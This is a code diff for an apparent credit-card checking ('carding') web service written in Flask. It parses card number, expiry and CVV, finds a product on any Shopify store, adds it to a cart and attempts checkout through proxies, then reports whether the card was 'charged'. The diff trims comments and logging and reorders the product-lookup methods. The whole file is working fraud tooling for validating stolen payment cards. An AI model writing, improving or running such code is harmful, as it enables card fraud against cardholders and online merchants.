@@ -1,7 +1,6 @@
 from flask import Flask, request, jsonify
 import requests
 import re
-import json
 import logging
 import os
 from datetime import datetime
@@ -9,7 +8,6 @@ from datetime import datetime
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-# ---------- HELPERS ----------
 def extract_cc(text):
     pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
     match = re.search(pattern, text)
@@ -21,11 +19,8 @@ def extract_cc(text):
     return None, None, None, None
 
 def get_product_and_variant(site, session, proxy_dict):
-    """
-    Fetch a product and its first available variant.
-    Returns (product_id, variant_id) or (None, None)
-    """
-    # Method 1: Get first product from products.json
+    """Fetch a product and its first available variant using multiple methods."""
+    # Method 1: products.json
     try:
         url = f"{site}/products.json?limit=1"
         resp = session.get(url, proxies=proxy_dict, timeout=15)
@@ -36,16 +31,14 @@ def get_product_and_variant(site, session, proxy_dict):
                 product_id = product['id']
                 variants = product.get('variants', [])
                 if variants:
-                    # Find first variant that is available (or just take first)
                     for v in variants:
                         if v.get('available', True):
                             return product_id, v['id']
-                    # If none available, take first anyway
                     return product_id, variants[0]['id']
     except:
         pass
 
-    # Method 2: Try collections
+    # Method 2: collections/all/products.json
     try:
         url = f"{site}/collections/all/products.json?limit=1"
         resp = session.get(url, proxies=proxy_dict, timeout=15)
@@ -63,20 +56,8 @@ def get_product_and_variant(site, session, proxy_dict):
     except:
         pass
 
-    # Method 3: Try cart.js (if items exist)
-    try:
-        url = f"{site}/cart.js"
-        resp = session.get(url, proxies=proxy_dict, timeout=15)
-        if resp.status_code == 200:
-            data = resp.json()
-            if data.get('items'):
-                item = data['items'][0]
-                return item.get('product_id'), item.get('variant_id')
-    except:
-        pass
-
-    # Method 4: Common product IDs with variants
-    for pid in [1, 2, 3, 4, 5, 10, 100]:
+    # Method 3: try common product IDs (1 to 20)
+    for pid in range(1, 21):
         try:
             url = f"{site}/products/{pid}.json"
             resp = session.get(url, proxies=proxy_dict, timeout=10)
@@ -94,10 +75,21 @@ def get_product_and_variant(site, session, proxy_dict):
         except:
             pass
 
+    # Method 4: try to get product from cart (if items exist)
+    try:
+        url = f"{site}/cart.js"
+        resp = session.get(url, proxies=proxy_dict, timeout=15)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('items'):
+                item = data['items'][0]
+                return item.get('product_id'), item.get('variant_id')
+    except:
+        pass
+
     return None, None
 
 def add_to_cart(site, session, variant_id, proxy_dict):
-    """Add variant to cart using variant ID"""
     try:
         url = f"{site}/cart/add.js"
         payload = {'id': variant_id, 'quantity': 1}
@@ -106,34 +98,11 @@ def add_to_cart(site, session, variant_id, proxy_dict):
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         resp = session.post(url, data=payload, headers=headers, proxies=proxy_dict, timeout=20)
-        # Sometimes returns 200 even if error? Check response content
-        if resp.status_code == 200:
-            try:
-                data = resp.json()
-                if data.get('status') == 'error':
-                    app.logger.error(f"Cart add error: {data.get('message')}")
-                    return False
-                return True
-            except:
-                return True
-        return False
-    except Exception as e:
-        app.logger.error(f"add_to_cart exception: {e}")
-        return False
-
-def get_cart_token(site, session, proxy_dict):
-    try:
-        url = f"{site}/cart.js"
-        resp = session.get(url, proxies=proxy_dict, timeout=15)
-        if resp.status_code == 200:
-            data = resp.json()
-            return data.get('token')
+        return resp.status_code == 200
     except:
-        pass
-    return None
+        return False
 
 def process_payment(site, session, card, month, year, cvv, proxy_dict):
-    """Submit payment – simplified but realistic"""
     checkout_url = f"{site}/checkout"
     try:
         resp = session.get(checkout_url, proxies=proxy_dict, timeout=20)
@@ -207,20 +176,13 @@ def checkout_shopify(site, card, month, year, cvv, proxy=None):
             ip, port = parts
             proxy_dict = {'http': f'http://{ip}:{port}', 'https': f'https://{ip}:{port}'}
 
-    # 1. Get product and variant
     product_id, variant_id = get_product_and_variant(site, session, proxy_dict)
     if not product_id or not variant_id:
-        app.logger.error(f"No product/variant found for {site}")
         return {"Response": "No product or variant found on this store", "Price": 0, "Gateway": "Shopify Payments"}
 
-    app.logger.info(f"Found product: {product_id}, variant: {variant_id}")
-
-    # 2. Add to cart using variant ID
     if not add_to_cart(site, session, variant_id, proxy_dict):
-        app.logger.error(f"Failed to add variant {variant_id} to cart")
         return {"Response": "Failed to add product to cart", "Price": 0, "Gateway": "Shopify Payments"}
 
-    # 3. Process payment
     result = process_payment(site, session, card, month, year, cvv, proxy_dict)
 
     if result['status'] == 'charged':
@@ -232,7 +194,6 @@ def checkout_shopify(site, card, month, year, cvv, proxy=None):
     else:
         return {"Response": f"ERROR: {result['message']}", "Price": 0, "Gateway": "Shopify Payments"}
 
-# ---------- API ENDPOINT ----------
 @app.route('/shopify', methods=['GET'])
 def shopify_check():
     site = request.args.get('site')
@@ -256,7 +217,6 @@ def shopify_check():
         app.logger.error(f"Unhandled exception: {e}")
         return jsonify({"Response": f"ERROR: {str(e)}", "Price": 0, "Gateway": "Shopify Payments"}), 500
 
-# ---------- HEALTH ----------
 @app.route('/ping')
 def ping():
     return jsonify({"status": "alive", "time": datetime.now().isoformat()})
